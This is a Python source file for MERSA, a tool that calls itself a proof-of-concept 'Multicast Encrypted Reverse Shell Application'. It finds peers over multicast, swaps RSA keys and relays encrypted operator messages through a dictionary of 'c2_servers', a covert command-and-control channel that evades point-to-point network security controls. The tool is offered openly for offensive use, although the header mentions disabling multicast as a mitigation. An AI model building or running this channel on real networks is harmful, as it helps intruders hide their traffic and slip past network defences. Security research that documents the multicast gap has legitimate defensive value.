"""\
   o       .                         o      .
                      .
  .   dBBBBBBb  dBBBBP dBBBBBb  dBBBBP dBBBBBb 
     dB'   dB' dB     dB  dBP BP'          'BB 
    dB'dB'dB' dBBP   dBBBBP' 'BBBBb   dBBBPBB  .
   dB'dB'dB' dBP    dBP  BB     dBP  dBP   BB 
  dB'dB'dB' dBBBBP dBP  dB  dBBBBP' 'dBBBBBB 
     .                                          
                                .
         .         o    
                                        .
  .      |                
       --o--    We in your walls   .
         |                                   o
 o             .

Multicast Encrypted Reverse Shell Application (MERSA) is a POC tool that demonstrates how multicast can be used to bypass point-to-point restrictions on secured network.

MERSA is a non-vendor specific vulnerability that undermines network security policies by operating on multicast. Multicast uses IGMP (L2) or PIM (L3), depending on the type of network, to route multicast traffic. As a result, some networks' security policies can be bypassed due to gaps in the security controls for multicast routing.

Multicast is often forgetten about and rarely utilized within most networks. As a result, it can be overlooked as a vulnerability. The goal of MERSA is to bring attention to the existing security gaps in networks that have multicast enabled. The best way to mitigate any risks against multicast, is to disable it in the router configuration file.\
"""

import socket
import sys
import time
import struct
import os.path
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def encrypt(plaintext, public_key):
  cipher = PKCS1_OAEP.new(public_key)
  ciphertext = cipher.encrypt(bytes(plaintext))
  return ciphertext

def decrypt(ciphertext, private_key):
  cipher = PKCS1_OAEP.new(private_key)
  return cipher.decrypt(ciphertext)

def IPv4LAN():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(("255.255.255.255", 1))
    IP = s.getsockname()[0]
  except Exception:
    IP = "127.0.0.1"
  finally:
    s.close()
  return IP

def laplace(demon, parm=None, wait=False, prefix="Ld_"):
  """The Daemon Handler that knows where all the demons are and therefore where they will be.
  """
  while threading.active_count() > 150:
    time.sleep(0.25)
  if callable(demon):
    if wait != True:
      if type(parm) in [type([]), type(())]:
        d = threading.Thread(target=demon, args=parm)
      elif type(parm) in (type(1), type(""), type(1.0), type(True)):
        d = threading.Thread(target=demon, args=(parm,))
      else:
        d = threading.Thread(target=demon)
      d.daemon = True
      dname = f"{prefix}{demon.__name__}"
      if dname in str(threading._active):
        if "y" in input(f"[Laplace] {dname} is already running, are you sure you would like to continue? [y/n] ").lower():
          d.setName(dname)
          d.start()
      else:
        d.start()
    else:
      if parm != None:
        demon(parm)
      else:
        demon()
  else:
    print(f"[Laplace] {demon} is not callable. Consult your python spellbook.")

def multicast_socket(port=None, ttl=5, hops=255):
  """Returns multicast socket and binds the socket if the port is given.
  """
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops)
  if port != None:
    sock.bind(("0.0.0.0", port))
  mreq = struct.pack("4sl", socket.inet_aton("224.0.0.251"), socket.INADDR_ANY)
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
  sock.settimeout(ttl)
  return sock

def display_hosts():
  servers = list(c2_servers.keys())
  for serv in c2_servers.keys():
    print(f"+ -- =[ OPTION: {servers.index(serv)}{' '*(23-len(serv))}{serv} ]")
  print()

def c2_mersa(multicast_group="224.0.0.251", multicast_port=514):
  """This prompts for and sends encrypted messages to hosts.
  """
  print("     =[ Type 'discover' to find hosts.   ]")
  soc = multicast_socket()
  while True:
    display_hosts()
    while True:
      servers = list(c2_servers.keys())
      try:
        opt = input("MERSA(host-id) % ").strip()
        if opt.lower() == "discover":
          soc.sendto(public_key, (multicast_group, 667))
        elif opt in servers:
          break
        elif opt.isdigit():
          opt = servers[int(opt)]
          break
        else:
          display_hosts()
      except KeyboardInterrupt:
        soc.close()
        KeyboardInterrupt()
        sys.exit()
      except Exception as e:
        pass
    
    ciphertext = encrypt(input(f"MERSA({opt}) % ").encode(), c2_servers[opt])
    
    soc.sendto(ciphertext, (multicast_group, multicast_port))
    
  soc.close()

def listen_mersa(multicast_port=514):
  """Automatically attempts to unencrypt messages using the private key.
  """
  soc = multicast_socket(multicast_port)
  while True:
    try:
      data, addr = soc.recvfrom(2048)
      if addr[0] in c2_servers.keys():
        try:
          plaintext = decrypt(data, private_key)
          print(f"\n\n[MSG-RECV][{addr[0]}] {plaintext}")
        except KeyboardInterrupt:
          soc.close()
          break
        except:
          pass
    except KeyboardInterrupt:
      soc.close()
      break
    except:
      pass

def listen_key(multicast_group="224.0.0.251", multicast_port=667):
  """Waits for host to send public key and will automatically respond with its own.
  """
  soc = multicast_socket(multicast_port)
  while True:
    try:
      data, addr = soc.recvfrom(2048)
      if addr[0] != IPv4LAN():
        soc.sendto(public_key, (multicast_group, multicast_port))
      pub = RSA.importKey(data)
      if addr[0] not in c2_servers.keys() and addr[0] != IPv4LAN():
        c2_servers.update({addr[0]:pub})
        print(f"\n\n[JOIN] {addr[0]} has joined.")
      time.sleep(5)
    except KeyboardInterrupt:
      soc.close()
      break
    except Exception as e:
      pass

if __name__ == "__main__":
  
  if len(sys.argv) <= 1:
    pemfile = "./private.pem"
  else:
    pemfile = sys.argv[1]
  
  if not os.path.isfile("./private.pem"):
    if "y" in input("Generate new RSA private key? [y/n] ").lower():
      private_key = RSA.generate(2048)
      with open("./private.pem","wb") as p:
        p.write(private_key.exportKey())
    else:
      sys.exit()
  else:
    with open("./private.pem") as p:
      private_key = RSA.importKey(p.read())
  
  public_key = private_key.publickey().exportKey()
  
  print(__doc__.split("\n\n")[0])
  
  if threading.active_count() > 1:
    print(" .   Attempting to exercise %s daemons...    .\n"%(threading.active_count()-1))
    KeyboardInterrupt()
    time.sleep(3)
  
  c2_servers = {}
  
  laplace(listen_mersa)
  laplace(listen_key)
  c2_mersa()